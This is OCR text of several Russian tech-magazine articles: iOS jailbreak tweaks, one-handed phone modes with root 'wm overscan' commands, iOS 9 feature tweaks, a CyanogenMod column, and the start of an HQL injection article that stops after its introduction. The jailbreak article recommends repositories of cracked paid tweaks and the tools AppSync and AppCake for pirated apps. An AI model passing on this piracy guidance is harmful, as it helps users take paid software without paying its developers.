дальше? Если ты задаешься этим вопросом, то эта ста-
тья для тебя.


ВВЕДЕНИЕ
Одна из основных возможностей, которую дает джейлбрейк, — это глубокая
настройка устройства, улучшение его интерфейса и расширение возмож-
ностей. Все эти преимущества пользователь получает лишь после установ-
ки специальных программ, называемых также твиками. Никто точно не может
сказать, сколько твиков сегодня существует, однако очевидно, что их гораздо
больше, чем надо обычному пользователю. Потому в данной статье попробу-
ем описать самые полезные твики, при помощи кото-
рых можно превратить iPhone в «идеальный смартфон».

РЕПОЗИТОРИИ
Для установки твиков их необходимо откуда-то ска-
чивать, удобнее всего — при помощи репозиториев
Cydia. В предустановленных репозиториях отсутству-         INFO
ют многие твики, другие платны, потому рекомендуем
                                                                        Большинство обо-
подключить следующие репозитории:                                                                        зреваемых твиков
•  cydia.vn — репозиторий с большим количеством       для внесения измене-
   платных твиков из других источников, которые мож-      ний в систему требуют
                                                                              Respring — перезагруз-   но скачать здесь бесплатно. Но скорость передачи                                                                           ки Springboard устрой-
   данных достаточно низкая.                                           ства, которая длится
•  apt.modmyi.com — один из наиболее популярных           10–15 с.
   репозиториев. В наличии огромное количество са-                                                                 При установке указан-
  мых разных твиков, многие из которых, правда, плат-                                                                       ных в статье твиков
   ные.                                                                не забывай удалять
•  repo.insanelyi.com — большое количество взло-       старые, выполняющие
                                                                        сходные функции.
   манных твиков, быстрая заливка обновлений и но-                                                             В противном случае
   вых пакетов.                                                        устройство может пере-
•  cydia.zodttd.com/repo/cydia — также популяр-         йти в Safe Mode.
  ный и стабильный репозиторий.
Не следует брезговать и стандартным репозиторием BigBoss. Это один из не-
многих источников, где практически невозможно найти нестабильные или не-
безопасные твики.

MUST HAVE
Некоторые твики стоит устанавливать сразу после джейлбрейка устройства,
так как без них дальнейшая кастомизация аппарата может быть невозможной.
Обычно такие твики доступны в стандартном репозитории BigBoss.
  В первую очередь обрати внимание на приложение WhiteTerminal. Данная
утилита, позволяющая работать с устройством в режиме командной строки,
позволит запускать множество других утилит, лишенных графического интер-
фейса. Твик очень прост и имитирует приложение «Терминал» на OS X.
   Если ты планируешь устанавливать взломанные приложения на устройство
(а это одна из основных причин джейлбрейка), скачай AppSync. Твик, доступ-
ный в репозитории cydia.appaddict.org, дает возможность загружать отвязан-
ные программы с компьютера при помощи таких программ, как iFunBox или
iTools.
   Также стоит обзавестись файловым менеджером. Лучший ФМ для джей-
лбрейкнутых iOS-устройств — iFile. Утилита, изначально мало отличавшаяся
от своих многочисленных конкурентов, сегодня получила ряд дополнительных
функций и стала действительно универсальным решением. Основные воз-
можности:
•  перемещение, переименование, удаление файлов, изменение их атрибу-
   тов;
•  просмотр видео, прослушивание музыки, работа с текстовыми документа-
   ми, презентациями, редактирование документов TXT, HTML;
•  установка твиков;
•  массовая обработка файлов;
•  создание папок и ярлыков;
•  архивирование и разархивирование файлов.

Если же ты собираешься работать с файловой системой устройства с ком-
пьютера, тебе понадобится afc2add или Apple File Conduit «2». Обе эти утилиты
не имеют интерфейса и предназначены лишь для одного — открыть доступ
к корню ФС аппарата при подключении к десктопу.
  Для глобального изменения Springboard (рабочего стола) предназначен
твик WinterBoard, под который создано огромнейшее количество тем и допол-
нений. Он может изменять вид дока и иконок, позволяет добавлять на рабочий
стол виджеты и многое другое.
Настройки WinterBoard      Изменяем иконки          Виджеты


Все темы WinterBoard хранятся в папке /Library/Themes/, из которой их мож-
но извлечь и модифицировать. Существует также огромное количество каче-
ственных и проработанных тем, которые изменя-
ют не только вид рабочего стола, но и часть меню,
а также обладают высоким уровнем кастомизиру-
емости.

УЛУЧШАЕМ ИНТЕРФЕЙС
Несмотря на то что стандартных настроек в iPhone
больше, чем во многих прошивках Android, неко-
торых опций не хватает. Это касается в основном
тонкой настройки интерфейса. Решить проблему
можно с помощью твика Springtomize, который уже
доступен для iOS 9. Настройки утилиты разделе-
ны на секции опций для конкретных элементов ин-
терфейса. Можно сменить скорость анимации, на-
строить создание многоуровневых папок, убрать
слайдер на экране блокировки или скрыть разде-
лители в центре управления, ввести собственное
название оператора, а также совершить многие
другие усовершенствования интерфейса.                                                       Главное меню Springtomize
   Часто пользователи Android-устройств заявляют, что в ОС от Apple не хватает
виджетов на «рабочем столе». Такая функциональность реализуется при помо-
щи твика iWidgets. Изначально доступно только два виджета (аналоговые часы
и календарь), однако их количество можно расширить: в темах для WinterBoard
и просто в Cydia присутствуют виджеты, которые работают на основе данного
приложения. Просто нажми на пустом месте на домашнем экране, и появит-
ся меню возможных для установки виджетов. Все виджеты хранятся в папке /
User/Library/iWidgets/, куда их можно добавлять самостоятельно.
  Для изменения сетки иконок используется Iconoclasm. В его настройках
можно выбрать необходимую сетку как для всех экранов, так и для каждого
в отдельности.





Изменяем стандартную сетку  Настройки Iconoclasm       Отдельные настроки для каж-
                                                        дого экрана Springboard

Часто необходимо расширить функциональность статусной
строки, чтобы она показывала не только актуальные данные
об устройстве, но и, например, уведомления или выполняла
иные функции. Для всего этого предназначена утилита Confero.
Здесь настраивается и общий стиль статусной строки, и отдель-
ные ее части. Можно указать, где должны показываться значки   WWW
уведомлений, а также назначить жесты из Activator (о нем позже).
                                                                                            WhiteTerminal
  Для изменения логотипа оператора уже несколько лет наи-
более популярным решением остается Zeppelin. Тут есть мно-              iFile
жество значков, которые можно использовать вместо надоев-
шей надписи.
   Прекрасной утилитой для модификации центра управле-
ния и панели многозадачности была Auxo, однако данный твик
до сих пор не оптимизирован для iOS 9, как и ряд других альтер-
                                     WWW
нативных приложений. Заменой ему сегодня может послужить
Lylac, бесплатный и доступный в ряде описанных выше репози-       WinterBoard
ториев. Основные возможности твика Lylac:
                                                                                           Springtomize•  совмещение центра управления и панели многозадачно-
   сти в одно меню (вызывается так же, как и оба эти элемента         iWidgets
   управления по отдельности);
                                                                                       Mix Toolbox•  гибкая настройка центра управления (включение тех или
   иных панелей и тумблеров, их расположение в окне);                                                                                         UnlimTones
•  точная настройка панели многозадачности (каким образом
   происходит прокрутка, на каком окне открывается, допол-          Bridge
   нительные возможности);                                                                               AppCake
•  одновременное закрытие всех приложений свайпом до-
   машнего экрана вверх;                                                          AirBlue Sharing
• меню для выполнения перезагрузки, включения безопасно-                                                                                                        Activator
   го режима и выключения устройства при свайпе домашнего
   экрана вниз.                                                          MyWi





измененный интерфейс      меню выключения           настройки
многозадачности
Разработчики iOS идут по пути увеличения ка-
стомизируемости  центра  уведомлений: была
реализована поддержка виджетов, теперь воз-
можна  настройка отображения  уведомлений,
для каждой программы выделено специальное
меню. Тем не менее многие элементы центра
уведомлений до сих пор не могут быть измене-
ны стандартным образом. Для гибкой настройки
ЦУ и скрытия ненужных элементов будет полезен
твик Mix Toolbox. Свои настройки он имеет также
и для центра управления.
   Твик Grabby открывает возможность добавить не-
сколько переключателей на панель быстрого вызова
камеры в правом нижнем углу. Настройки предельно
просты: информация о количестве требуемых пере-
ключателей и гибкая настройка каждой иконки.
   Другой полезный твик для экрана блокиров-
ки — SubtleLock. Он позволяет сменить верхнюю
и нижнюю панель заблокированного устройства.  Настройки центра
                                                    уведомлений в Mix ToolboxОтдельными разделами вынесены настройки ча-
сов (шрифт, размер, стиль, цвет, показ времени
в секундах и другое) и слайдера (спрятать или из-
менить размер или содержание надписи).

СНИМАЕМ ОГРАНИЧЕНИЯ
Для многих пользователей ограничения iOS кажут-
ся абсурдными и непонятными. Именно поэтому
еще с первых дней существования джейлбрейка
создавались твики, призванные их обойти. Рас-
смотрим несколько широко известных ограниче-
ний и способов их устранения.
  По задумке Apple, на iPhone в качестве рингто-
на можно загружать только музыку специального
формата M4R длительностью не более тридцати
секунд. При этом установить любую песню, даже
из нативного приложения и соответствующую
данным требованиям, не получится: необходимо
специально загружать файл как рингтон в iTunes.
Для снятия такого неприятного ограничения су-  Настройки SubtleLock
ществует твик UnlimTones.
  Основные особенности UnlimTones:
•  онлайн-сервис с огромным количеством рингтонов на любой вкус;
•  встроенный браузер с возможностью скачивания музыки для рингтонов;
•  быстрое создание рингтонов из музыки, расположенной в нативном при-
   ложении. Обрезка рингтонов до необходимой длины.

Единственным недостатком приложения можно назвать обилие рекламы, ко-
торая здесь есть даже в главном меню.
Часто    пользователи
Apple жалуются на огра-
ничения,    связанные
с невозможностью за-
грузить музыку и  ви-
део. Без джейлбрейка
скачивать медиафайлы
на устройство и прои-
грывать их в нативном
приложении невозмож-
но. Твик Bridge призван
решить эту проблему.
  Основные  особен-
ности твика Bridge:
•  скачивание  музыки
   и видео из интер-
   нета  (ввод  ссылки
   для скачивания);
•  импорт в медиатеку                          Список мелодий UnlimTones   Обработка мелодии
   из файловой систе-
   мы. Массовый импорт медиа;
•  изменение тегов файлов. Переименование файлов.

Не менее неприятно, что устанавливать приложения на iOS без джейлбрей-
ка официально можно только из App Store. Частично проблему решает тот же
vShare или Tongbu, однако эти программы работают крайне нестабильно. Го-
раздо более предпочтительный вариант — твик AppCake.
  Основные возможности AppCake:
•  встроенный «магазин» взломанных приложений;
•  скачивание и установка ipa-программ из интернета;
•  встроенный торрент-клиент для скачивания приложений;
•  обновление загруженных приложений из App Store, удаление с рабочего
   стола и из приложения.
Еще одна востребованная функция — передача файлов по Bluetooth. Для это-
го предназначена уже давно разрабатываемая утилита AirBlue Sharing. При по-
мощи программы можно получать и отправлять файлы на любое устрой-
ство, а не только на «яблочные» девайсы. Просто выбери необходимый файл
в ФС устройства и отправь его при помощи кнопки Send.

РАСШИРЯЕМ ВОЗМОЖНОСТИ
Если ты хочешь настроить быстрое управление разнообразными функциями
устройства при помощи его аппаратных компонентов (дисплея, акселероме-
тра, переключателей), то тебе нужен твик Activator. Этот твик настолько популя-
рен, что многие джейлбрейк-разработчики пишут твики, активировать кото-
рые можно только с его помощью.
  Для многих пользователей iOS-устройств остается актуальной проблема
записи телефонных звонков на аппарате, которую приложения из App Store
решают лишь  частич-
но. Твик AudioRecorder
обеспечивает  данную
возможность.
  Функции
AudioRecorder:
•  запись телефонных
   звонков, звонков
   FaceTime и систем-
   ных звуков;
•  проигрывание пре-
  дупреждающего
   о начале записи
   сигнала;
•  настройка вклю-
   чения жестами
   Activator или запись
   всех звонков;
•  возможность по-
   делиться записями    Главное меню AudioRecorder  Настройки AudioRecorder
   разговоров.

Если ты хочешь использовать свое устройство в качестве беспроводного
маршрутизатора, тебе пригодится твик MyWi. Он позволяет создать хотспот
в один клик (поддерживается раздача интернета по Bluetooth, Wi-Fi и с помо-
щью проводного соединения).
ЗАКЛЮЧЕНИЕ
При помощи джейлбрейк-твиков и утилит можно
расширять возможности устройств iOS до беско-
нечности. Трудно найти такую функцию, которая
не могла бы быть реализована при помощи этих
программ. Главное здесь — понимать, какие воз-
можности действительно пригодятся, и не уста-
навливать лишнее. Все твики, приведенные в ста-
тье, достаточно стабильны и, запущенные вместе,
не вызывают конфликтов, однако их совместная
работа может сильно увеличить энергопотребле-
ние устройства и сделать его работу более мед-
ленной.





                                                       Главное меню MyWi
MOBILE
ОДНОРУКИЙ





                                                                                  Евгений Зобнин
                                                                                                                 androidstreet.netБАНДИТ
             ИСПОЛЬЗУЕМ
             ГУГЛОФОН И АЙФОН
            ОДНОЙ РУКОЙ
              БЕЗ НЕУДОБСТВ
Раньше трава была зеленее, девушки красивее, а смарт-
фоны имели адекватные размеры. А вот их современные
аналоги стали настолько большими, что использовать
их одной рукой может разве что двухметровый гигант
с огромными ладонями. К счастью, в большинстве случаев
ситуацию можно если не исправить, то хотя бы облегчить,
используя различные настройки и хаки Android и iOS.


3.5 дюйма — идеальный размер экрана для работы со смартфоном одной
рукой, и именно по этой причине он был выбран для первых моделей iPhone.
За Apple последовали и другие производители. В период с 2007 по 2009 год
самыми ходовыми размерами экрана были 3.2, 3.5 и 3.7 дюйма; смартфоны
были ориентированы на работу одной рукой и обладали кучей других преиму-
ществ компактных устройств.
   Сегодня средний размер экрана смартфона — 5 дюймов (пять, Карл!), поэ-
тому говорить об удобстве использования одной рукой или ношении смартфо-
на в переднем кармане джинсов уже не приходится. Ты либо тыкаешь по экра-
ну одной рукой, держа его в другой (по сути — так же, как во времена всем
ненавистных стилусов), либо роняешь, пытаясь дотянуться до краев экрана
большим пальцем.


Знаменитое изображения зон покрытия
пальца в разных моделях iPhone





Осознавая данную проблему, производители придумывают разного рода
ухищрения. В iOS есть режим Reachability, при активации которого экран как бы
сдвигается вниз, в прошивках от Samsung — режим сворачивания всего со-
держимого экрана в плавающее окно, у других производителей — свои анало-
ги данных функций. В этой статье мы поговорим как раз об этих функциях,
а также о том, как расширить их функциональность или заменить на более
удобный аналог. Отдельно я также покажу, как получить функциональность
one-handed mode на стоковой Android-прошивке и в любом кастоме.

IPHONE
Начнем с iPhone. Здесь все просто: стан-
дартная  функция  Reachability  работает
без проблем и по умолчанию доступна
на iPhone 6/6S и iPhone 6/6S Plus. Все, что
нужно сделать — два раза тапнуть по сен-
сору Touch ID, и экран сдвинется вниз. Вер-
нуть его обратно можно либо таким же об-
разом, либо просто ничего не нажимая
в течение нескольких секунд.
  Вроде бы все просто... но есть несколь-
ко проблем. Во-первых, Reachability никак
не конфигурируется: если тебе нужно расши-
рить размер «окна» или изменить его другим
образом, ничего не получится. Ешь что дают.
Во-вторых, сама реализация этого режима
далеко не идеальна: окно запущенного при-
ложения имеет нестандартные и неудобные
размеры, и правая сторона экрана все рав-
но оказывается в трудно достижимой зоне.
   Эти проблемы можно решить с помощью
jailbreak и твиков. Твик SimpleReach добав-
ляет настройки, которые позволяют создать                                              Настройки SimpleReach
несколько вариантов «высоты окна», доступ-
ных по свайпу от датчика Touch ID вверх, вверх-влево или вверх-вправо — ито-
го три разных настройки высоты. Должно быть вполне достаточно.
  Для решения остальных проблем лучше всего подойдет твик OneHandWizard:
он заменяет стандартную реализацию Reachability на более адекватное и удоб-
ное решение. После его установки содержимое экрана больше не будет съез-
жать вниз при двойном тапе — вместо этого экран будет масштабироваться
до небольшого окна с правой или с левой стороны экрана. Другими словами,
содержимое экрана просто станет меньше.
  По умолчанию размер окна будет примерно равен размеру экрана iPhone 5,
но потянув за край, его можно увеличить или уменьшить до определенных разме-
ров. Твик позволяет решить проблему «дотя-
гивания» до физических кнопок. Сбоку от окна
есть кнопка для показа интерфейса управле-
ния настройками звука, блокировки экрана
и снятия скриншота. Кстати, цена твика $3.99.

ANDROID
С Android все намного сложнее. Чистая вер-
сия системы, распространяемая Google, во-
обще не имеет подобных функций; поэтому
производители реализуют ее сами, разны-
ми методами и с разной степенью удобства.

Samsung
Наверное,  лучшая  реализация  функции
управления одной рукой —  у Samsung.
Здесь доступно сразу две реализации: ты
можешь  либо  включить  масштабирова-
ние интерфейса, когда содежимое экрана
уменьшается так, чтобы ты мог дотянуться
до всех элементов управления (аналог твика
OneHandWizard), либо активировать функ-   Так будет выглядеть интерфейс
                                               после установки и активации
цию сдвигания таких вещей как клавиатура,                                              OneHandWizard
кнопки калькулятора и окно ввода пин-кода
в одну из сторон экрана.
  Обе функции доступны в Настройках: «Экран и обои -> Управление одной
рукой». Досточно просто включить одну из них. После этого вторая функция за-
работает сама, а для активации первой нужно будет нажать кнопку «Домой» три
раза. В старых прошивках (Galaxy S5, например) функция активируется с помо-
щью свайпа от края экрана с возвращением пальца к краю (туда-обратно).

Asus
Прошивка смартфонов Asus также поддерживает режим масштабирования
(уменьшения) картинки на экране с целью сделать все элементы интерфейса
доступными для большого пальца. Активируется она в разделе «Режим управ-
ления одной рукой» в настройках, а включается с помощью двойного тапа
по кнопке домой. Очень просто.

LG
Реализация функции управления одной рукой в смартфонах LG гораздо бед-
нее. По сути все, что тут есть — это возможность включить тот самый сдвиг кла-
виатуры, номеронабирателя и окна ввода пин-кода
на экране блокировки влево или вправо. Для ее ак-
тивации идем в настройки: «Настройки -> Устрой-
ство -> Управление одной рукой». Все три функции
можно включить отдельно.
                                                       INFO
Другие                                                      Для активации режима работы
Прошивки многих других смартфонов также включа-      одной рукой в MIUI достаточно
ют в себя функции для работы одной рукой. Тот же           провести от кнопки
                                                                   «Домой» влево или вправо;
режим масштабирования доступен в смартфонах                                                                     для отключения — проделать
Sony, Huawei и Xiaomi. Нередко подобную функцио-         обратную операцию.
нальность можно встретить даже в прошивках ки-          Включить/Отключить
                                                               функцию полностью можнотайских ноунеймов. Главное, попытаться ее найти.                                                                       в дополнительных настройках,
                                                                           пункт «Использование одной
ЧИСТЫЙ ANDROID                                                         рукой».
И КАСТОМНЫЕ ПРОШИВКИ
Как я уже сказал, в чистом Android функции
для работы со смартфоном одной рукой нет.
Нет ее и в CyanogenMod, и во всех остальных
кастомах за исключением прошивки MIUI.
Поэтому если у тебя установлен AOSP или
CyanogenMod — придется применять хаки
и костыли.

Стандартные возможности
Самый простой способ — воспользоваться
стандартными функциями. В Android есть ко-
манда wm, которая позволяет работать с ме-
неджером окон, управляющим всем, что ты
видишь на экране. Возможности у нее раз-
ные, но в свете данной статьи нас интересует
только одна функция — overscan. Она позво-
ляет отодвинуть видимое на экране изобра-
жение на указанное количество точек от края.
  Имея права root и Android не ниже 4.3, ты
можешь использовать эту команду для сжи-
мания экрана на манер функции Reachibility
в iOS или других трансформаций. Формат
команды такой:
                                             После выполнения команды
                                wm overscan
wm overscan ЛЕВО,ВЕРХ,ПРАВО,НИЗ
Для проверки просто запусти любой эмуля-
тор терминала и выполни две команды:

su
wm overscan 0,500,0,0

Содержимое экрана должно съехать вниз
так же, как в iOS. Чтобы вернуть все обратно,
выполни такую команду:

wm overscan reset

Но как использовать эту функциональность
с удобством? Для этого можно задействовать
Tasker. Установи его, запусти, нажми кнопку
«плюс» на вкладке Profiles и выбери «Собы-
тие -> Sensor -> Shake». Когда появится окно
настроек — нажимаем назад, Tasker пред-
ложит создать задачу для данного профиля.
Введи ее имя, нажми кнопку «плюс» и выбери
«Код -> Run Shell». В строке Command введи
wm  overscan  0,500,0,0, отметь галочку Use  Создаем Tasker-профиль
Root и нажми кнопку назад.                   для включения режима одной руки
   Теперь  после  тряски смартфона  вле-
во-вправо будет включаться режим overscan. Но как вернуться обратно? Для это-
го понадобится еще один профиль Tasker. Сделаем так, чтобы режим overscan
отключался после гашения экрана. Вновь идем на вкладку Profiles, нажимаем
плюс, далее «Состояние -> Экран -> Display State -> Выкл» и проделываем ту
же процедуру, что в первом случае, но команду в этот раз указываем другую: wm
overscan reset. Все, теперь у нас есть режим для работы одной рукой, который
включается после тряски смартфона и отключается после гашения экрана.
  Но ты, конечно, не обязан делать все именно так: можешь настроить все
как тебе нравится. Tasker позволяет, например, запускать команды в ответ
на запуск приложения, времени и многих других событий.

Xposed
Если ты не хочешь возиться c настройками Tasker, есть и готовое решение этой
задачи: Xposed-модуль Niwatory. Для его установки необходимы права root,
а также (разумеется) установленный Xposed. Пользователи Android 4.0-4.4
могут просто скачать инсталлятор и с его помощью установить Xposed. Те, кто
уже перешел на 5.0-6.0, должны прошить Xposed самостоятельно с помощью
кастомной консоли восстановления. Файл
для прошивки можно получить в теме на фо-
руме XDA. Пользователи 5.0 скачивают файл
xposed-v78-sdk21-arm.zip,  5.1 — xposed-
v78-sdk22-arm.zip, 6.0 — xposed-v78-sdk23-
arm.zip. Оттуда же нужно получить и уста-
новить XposedInstaller_3.0_alpha4.apk.
   После установки запускаем XposedInstaller,
переходим в раздел «Загрузки», через поиск
находим и устанавливаем Niwatory, перехо-
дим в раздел «Модули», активируем модуль
и перезагружаемся.
   У Niwatory довольно интересный принцип  Установленный и активированный
                                                Xposed-модуль Niwatoryработы. Во-первых, он активируется с помо-
щью шорткатов (или виджета на рабочем столе), которые можно вызывать через
другие приложения. Шорткаты Niwatory можно вызывать через LMT Launcher
или повесить их на экранные кнопки навигации (кастомные прошивки позво-
ляют это сделать).
   Во-вторых, нужная нам функция уменьшения окна приложения здесь рабо-
тает в отношении содержимого именно этого окна, а не всего экрана целиком.
Более того, она работает даже в отношении таких сущностей как вытянутая
шторка. В-третьих, Niwatory позволяет не только уменьшить содержимое окна
приложения, но и сделать его плавающим. То есть в буквальном смысле: если
ты не дотягиваешься до какого-либо элемен-
та, ты можешь просто подвинуть его ближе.

ВЫВОДЫ
Смартфоны с большими экранами — это,
безусловно, удобно, но только до тех пор,
пока тебе нужен именно полноценный кар-
манный компьютер. Когда речь заходит о та-
ких действиях, как «позвонить» или «быстро
ответить на сообщение», большой экран (и,
как следствие, размеры) становится серьез-
ным препятствием. Однако, как мы выяснили,
есть множество путей и ухищрений обхода.
Да, все это грязные хаки и в идеальном мире
подобной функциональности в мобильных
ОС не должно быть вообще...
  Но мир не идеален.                                             Масштабирование приложения
                                                     с помощью Niwatory
MOBILE


ВЫПУСК #14.
IOS 9 И ВСЕ-ВСЕ-ВСЕ
КАРМАННЫЙ                 В iOS 9 появилось
                     множество интереснейших
                     и полезнейших функций,
                      однако многие из них
                     работают далеко не наСОФТ
                       всех девайсах. 3D Touch
                     и Live Photos завязаны
                      на iPhone 6S, функции
                     разделения экрана и
                     видео в плавающем окне
                      требуют как минимум iPad
                               Air 2. Однако с помощью
                       твиков все эти функции
                   можно получить на
                   любом устройстве под
                     управлением iOS 9 и даже
                     более низких версий.
3D TOUCH
3D Touch — одно из главных нововведе-
ний iPhone 6S и причина, по которой мно-
гие юзеры решили обновить свои девай-
сы. Основанная на Force Touch, которая
применяется в Apple Watch, данная техно-
логия позволяет экрану смартфона «чув-
ствовать» силу нажатия, а операционной
системе — реагировать на разные уровни
усилий. Это довольно странная техноло-
гия, но тем не менее она активно исполь-
зуется в iOS, так что пользователи старых
моделей iPhone фактически теряют часть
функциональности.                          Твик: RevealMenu
   Однако 3D Touch можно эмулировать,    Платформа: iOS 9
и уже появилось несколько твиков, позво-    Репозиторий: BigBoss
ляющих это сделать. RevealMenu — наибо-    Цена: бесплатно
лее правильная реализация. Данный твик
эмулирует 3D Touch с помощью классиче-
ского долгого удержания пальца. Никаких
настроек не требует, установил и поль-
зуйся. В довесок можно поставить твик
UniversalForce, делающий то же самое,
но не на рабочем столе, а в приложениях.
Работая вместе, они позволяют получить
полный экспириенс iPhone 6S.
PICTURE-IN-PICTURE
Еще одна очень привлекательная функция
iOS 9. Режим Picture-in-Picture позволяет
запустить видеоплеер в плавающем окне,
так что видео можно просматривать, пока
пользуешься другим приложением. Про-
блема только в том, что работает он ис-
ключительно на устройствах не ниже iPad
Air 2, а для смартфонов недоступен вооб-
ще, хотя, казалось бы, может быть полезен
на огромном экране iPhone 6S Plus.
  К счастью, есть несколько способов
решения этой проблемы, и один из самых
известных — это твик VideoPane от ле-
гендарного Райана Петрича. Фактически
это даже не эмуляция функции Picture-in-
Picture, а ее прародитель. Твик появился
еще в 2013 году и поддерживает любые
версии iOS начиная с пятой. Ну и соответ-
ственно, работает не только на планшетах,    Твик: VideoPane
но и на смартфонах.                      Платформа: iOS 5+
                                          Репозиторий: BigBoss
                                         Цена: бесплатно
SPLIT VIEW / SLIDE OVER
Вместе с функцией PiP в iOS 9 появились
также ее функции-собратья в лице Split
View и Slide Over. Первая разделяет экран
по вертикали и позволяет работать одно-
временно с двумя приложениями. Этой
возможности годами ждали все владель-
цы планшетов, независимо от установлен-
ной операционной системы. Вторая по-
зволяет «вытянуть» часть окна выбранного
приложения с правой стороны и, по сути,
является дополнением первой.              Твик: Medusa
   Получить данные функции, а также   Платформа: iOS 9
функцию PiP на устаревших устройствах   Репозиторий: repo.
позволяет твик Medusa. Это полный ана-    cpdigitaldarkroom.com
лог оригинальных функций, и он ни в чем   Цена: бесплатно
им не уступает. Более того, PiP и  Split
View будут работать даже на смартфонах.
Твик свежий и пока содержит в себе баги
и ограничения, но, скорее всего, они ис-
чезнут в финальной версии.
LIVE PHOTOS

Твик: EnableLivePhotos
Платформа: iOS 9
Репозиторий: BigBoss
Цена: бесплатно

Ну и последняя функция iOS 9, о которой мы поговорим, — это Live Photos,
то есть живые фотографии. Она позволяет создать нечто вроде короткого ани-
мационного ролика вместо статичного фото, но доступна только в последних
моделях iPhone. Принцип работы у нее довольно прост и основан на реализа-
ции zero shutter lag стандартной камеры iPhone.
   Как известно, смартфоны Apple отличаются способностью делать момен-
тальные снимки, которые получаются сразу при нажатии кнопки спуска. Ра-
ботает это благодаря тому, что камера iPhone начинает снимать сразу после
запуска, не дожидаясь нажатия кнопки. Она делает снимки один за другим
в постоянном режиме, а в момент нажатия кнопки просто берет последний
из них, стирая предыдущие.
   Live Photos сохраняет не только последний снимок, но и некоторое коли-
чество предыдущих, получая в результате анимацию. Активировать эту функ-
цию на любых устройствах под управлением iOS 9 можно с помощью твика
EnableLivePhotos. Также есть твик PhotosLive, который поддерживает iOS 8.
MOBILE: Колонка Евгения Зобнина
МЕЧТАЕТ ЛИ
MICROSOFT
О CYANOGENMOD?





                      Евгений Зобнин
                                      androidstreet.net

После публикации статьи о причинах установить
CyanogenMod я получил несколько писем, авторы которых
обвинили меня в рекламе коммерческой прошивки и ком-
пании Cyanogen Inc., известной тесным сотрудничеством
с Microsoft. Это действительно очень щепетильный вопрос,
и, так как он интересует не только авторов писем, но и
многих других пользователей Android, я решил вынести его
отдельной заметкой.
CyanogenMod — одна из первых кастомных Android-прошивок. Ее первая
версия появилась еще во времена HTC Dream и представляла собой просто
перепакованный образ стандартной прошивки с удаленными/замененными
приложениями и несколькими простыми модификациями. Начиная с шестой
версии CyanogenMod превратилась в полноценный форк Android. Теперь вме-
сто перепаковки образов прошивка собирается из дерева измененных исход-
ников Android, так же как это происходит в случае заводских прошивок от про-
изводителя.
  В сравнении с чистым Android CyanogenMod обладает массой дополни-
тельных функций и оптимизаций. В списке поддерживаемых официально и не-
официально числятся сотни различных устройств, от древнего Galaxy S до но-
вейшего Nexus 6P. В разработке принимают участие сотни человек из разных
стран. Все это бесплатно, безвозмездно и с открытым исходным кодом.
   Однако есть у CyanogenMod одна особенность. С 2012 года ее разработ-
ку курирует коммерческая организация Cyanogen Inc., созданная специально
для этой цели. А так как организация коммерческая, ей нужно как-то получать
прибыль — по сути, на труде сотен разработчиков, безвозмездно тративших
свои силы на CyanogenMod.
  Само собой, закрывать CyanogenMod и делать из нее коммерческую
ОС было не вариант, поэтому Cyanogen Inc. пошла совсем другим путем. Она
разделила CyanogenMod на две независимые операционные системы: полно-
стью открытую, бесплатную и развиваемую сообществом CyanogenMod и ком-
мерческую Cyanogen OS. Первая, как и раньше, доступна любому желающему
на странице загрузки или в открытых исходных кодах. Вторая предустанавли-
вается на смартфоны компаний, заключивших с Cyanogen Inc. соответству-
ющий договор (самые известные примеры — смартфоны Oppo N1 и OnePlus
One).
   Cyanogen OS базируется на CyanogenMod, но отличается от нее набором до-
полнительных функций и приложений. С недавнего времени некоторые из этих
приложений можно получить бесплатно и использовать поверх CyanogenMod.
Пакет C-Apps содержит приложение для управления звуком Audio FX, магазин
тем, продвинутую галерею, модифицированный номеронабиратель с интегри-
рованной поддержкой Truecaller и мощное приложение для работы с почтой.
  Кроме этого набора приложений, CyanogenMod включает в себя также
набор приложений от партнеров — тех самых компаний, которые в свое вре-
мя инвестировали в Cyanogen Inc. Одной из таких компаний как раз и была
Microsoft, в результате соглашения с которой в Cyanogen OS в скором времени
войдет набор приложений и сервисов компании, в том числе голосовой асси-
стент Cortana.
   Однако надо понимать, что данное соглашение касается исключитель-
но  Cyanogen  OS,  предустанавливаемой  на  смартфоны.  CyanogenMod,
как aftermarket firmware, по-прежнему будет распространяться с набором
стандартных приложений, и никакая Microsoft ее не затронет. Более того,
CyanogenMod продолжит развиваться как открытая прошивка с открытой мо-
делью разработки. Направление развития прошивки, как и раньше, будет опре-
деляться сообществом, и на бумаге Cyanogen Inc. вообще не должна вмеши-
ваться в этот процесс, кроме выделения фулл-тайм разработчиков.
  С другой стороны, перевод прошивки под крыло Cyanogen Inc. уже привел
к расколу в среде разработчиков. Вскоре после создания компании и полу-
чения первого венчурного финансирования команду покинул разработчик ка-
меры Focal, а сама камера через некоторое время была удалена из состава
прошивки. Желание создателей CyanogenMod монетизировать свое детище
также послужило причиной появления прошивки OmniROM, одним из ключе-
вых разработчиков которой стал легендарный Chainfire.
   Ухудшилась ли ситуация после сделки с Microsoft? Нет. CyanogenMod жи-
вет своей жизнью, и многие ее пользователи даже не подозревают о суще-
ствовании Cyanogen Inc. и каких-либо сделках с коммерческими компаниями.
Да и смартфон, работающий под Cyanogen OS, всегда можно перепрошить
и поставить чистую CyanogenMod. Возни тут от силы на двадцать минут.
Взлом





Алексей «GreenDog» Тюрин, Digital Security
agrrrdog@gmail.com,,twitter.com/antyurin
EASY





           WARNINGHACK
                    Вся информация предоставлена исключительно в ознакомительных целях.
                     Лица, использующие данную информацию в противозаконных целях, могут
                     быть привлечены к ответственности.
ЭКСПЛУАТИРУЕМ ИНЪЕКЦИИ
HIBERNATE QUERY LANGUAGE
Hibernate — популярнейший фреймворк для работы с базами данных на Java.
В нем реализован свой язык запросов (HQL), но есть лазейка, которая позво-
ляет выйти за его пределы и провести обычную SQL-инъекцию.
  В общем смысле object-relational mapping (ORM) — это связывание (ото-
бражение, mapping) объектно-ориентированной модели данных с традицион-
ными реляционными базами данных. Звучит такое определение замысловато,
так что попробую объяснить его на пальцах.
   У нас есть объектно-ориентированный язык вроде Java — в нем все по-
строено на классах и объектах. У объектов есть состояния — это совокуп-
ность значений их полей.
  С другой стороны, у нас есть обычные реляционные СУБД вроде MySQL,
где данные хранятся в виде записей в таблицах и некоторые таблицы связа-
ны между собой. Нередко возникает задача сохранить состояние какого-то
объекта в базу данных. Решается она просто: достаточно разобрать объект
на простейшие элементы (строки, числа, булевы значения...) и засунуть в та-
блицу. Восстанавливаются данные обратной операцией.
  Но если сохраняемые объекты сложнее (к примеру, внутри них есть ссылки
на другие объекты или многомерные массивы), то распихать все в нужные та-
блички и с нужными типами данных — это серьезная работа, хоть по большей
части и рутинная.
